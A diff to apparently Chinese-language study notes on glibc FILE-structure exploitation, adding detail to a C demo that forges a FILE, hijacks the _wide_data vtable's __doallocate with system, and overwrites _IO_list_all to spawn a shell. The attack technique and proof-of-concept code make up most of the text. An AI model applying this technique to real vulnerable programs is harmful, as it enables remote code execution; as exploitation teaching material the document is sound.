@@ -728,7 +728,7 @@ _IO_wdoallocbuf (FILE *fp)
   _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)->_wide_vtable
 ```
 
-也就是说，它会从 `_wide_data` 字段读取 vtable，调用这个 vtable 中的 __doallocate 字段指向的函数。而这个 vtable 是没有检查的，所以可以攻击它。具体地，把 `_wide_data->_wide_vtable->__doallocate` 指向 `system`，那么 `_IO_WDOALLOCATE (fp)` 就相当于调用了 `system(fp)`，这时候再把 fp 伪造成一个执行 shell 的命令，就实现了 get shell。演示代码如下：
+也就是说，它会从 `_wide_data` 字段读取 vtable，调用这个 vtable 中的 __doallocate 字段指向的函数。而这个 vtable 是没有检查的，所以可以攻击它。具体地，把 `_wide_data->_wide_vtable->__doallocate` 指向 `system`，那么 `_IO_WDOALLOCATE (fp)` 就相当于调用了 `system(fp)`，这时候再把 fp 伪造成一个执行 shell 的命令，就实现了 get shell。因为 `_wide_data` 和 `_wide_data->_wide_vtable` 都是指针，为了避免额外的分配，可以把它们都指向伪造的 FILE 结构体本身，各个字段是不会重合的。演示代码如下：
 
 ```c
 #include <stdint.h>
@@ -834,6 +834,7 @@ int main() {
   // & _IO_CURRENTLY_PUTTING) == 0 && _wide_data->_IO_write_base == 0
   // 3. required in _IO_wdoallocbuf: _wide_data->_IO_buf_base == 0 && (flags &
   // _IO_UNBUFFERED) == 0
+
   // doallocate is called with fake_file as its first argument,
   // we want it to be equivalent to system("/bin/sh").
   // therefore the _flags fields should pass the conditions above,
@@ -841,23 +842,52 @@ int main() {
   // _IO_NO_WRITES is 0x0008, _IO_CURRENTLY_PUTTING is 0x0800,
   // _IO_UNBUFFERED is 0x0002.
   // we can handle these bit fields by adding one space (0x20)
+  // offset 0x00
   char *flags = (char *)&fake_file->file._flags;
   strcpy(flags, " sh"); // 0x20, 0x73, 0x68, 0x00
-  fake_file->file._mode = 0;
-  fake_file->file._IO_write_ptr = (char *)1;
+
+  // offset 0x20
   fake_file->file._IO_write_base = (char *)0;
-  fake_file->file._wide_data =
-      (struct _IO_wide_data *)malloc(sizeof(struct _IO_wide_data));
-  fake_file->file._wide_data->_IO_write_base = 0;
-  fake_file->file._wide_data->_IO_buf_base = 0;
 
+  // offset 0x28
+  fake_file->file._IO_write_ptr = (char *)1;
+
+  // offset 0xc0
+  fake_file->file._mode = 0;
+
+  // offset 0xa0
+  // reinterpret fake_file as _IO_wide_data to avoid another malloc
+  fake_file->file._wide_data = (struct _IO_wide_data *)fake_file;
+
+  // offset 0x18
+  ((struct _IO_wide_data *)fake_file)->_IO_write_base = 0;
+
+  // offset 0x30
+  ((struct _IO_wide_data *)fake_file)->_IO_buf_base = 0;
+
+  // reinterpret fake_file as _IO_jump_t to avoid another malloc
+  // offset 0xe0
+  fake_file->file._wide_data->_wide_vtable = (struct _IO_jump_t *)fake_file;
+
+  // offset 0x68
   // doallocate is called within _IO_wdoallocbuf
-  struct _IO_jump_t *wide_vtable = malloc(sizeof(struct _IO_jump_t));
-  wide_vtable->__doallocate = system;
-  fake_file->file._wide_data->_wide_vtable = wide_vtable;
+  ((struct _IO_jump_t *)fake_file)->__doallocate = system;
 
-  // use IO_wfile_jumps as vtable to pass vtable validation
+  // use _IO_wfile_jumps as vtable to pass vtable validation
+  // offset 0xd8
   fake_file->vtable = (struct _IO_jump_t *)(libc_base + 0x1e8f60);
+
+  // all fields set:
+  // offset 0x00: fake_file->file._flags = " sh"
+  // offset 0x18: fake_file->file._wide_data->_IO_write_base = 0
+  // offset 0x20: fake_file->file._IO_write_base = 0
+  // offset 0x28: fake_file->file._IO_write_ptr = 1
+  // offset 0x30: fake_file->file._wide_data->_IO_buf_base = 0
+  // offset 0x68: fake_file->file._wide_data->_wide_vtable->__doallocate = system
+  // offset 0xa0: fake_file->file._wide_data = fake_file
+  // offset 0xc0: fake_file->file._mode = 0
+  // offset 0xd8: fake_file->vtable = _IO_wfile_jumps
+  // offset 0xe0: fake_file->file._wide_data->_wide_vtable = fake_file
 
   *list_all = fake_file;
 
